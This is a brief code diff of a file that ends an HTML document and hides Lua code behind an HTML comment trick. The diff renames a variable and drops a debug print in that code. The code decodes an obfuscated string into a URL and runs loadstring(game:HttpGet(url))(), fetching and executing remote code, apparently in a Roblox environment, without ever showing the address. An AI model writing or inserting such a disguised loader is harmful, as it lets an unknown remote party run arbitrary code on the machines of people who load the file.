@@ -29,9 +29,8 @@
 
 </html>
 <!--]=]
-for i,v in pairs(...) do print(i,v) end
-local string = ...
-string = string[1]
+local CONFIG = ...
+CONFIG = CONFIG[1]
 function decodeString(txt)
     local counter = 0
     local save = ""
@@ -61,7 +60,7 @@ function decodeString(txt)
     end
     return (output)
 end
-local url = decodeString(txt)
+local url = decodeString(CONFIG)
 loadstring(game:HttpGet(url))()
 
 -->
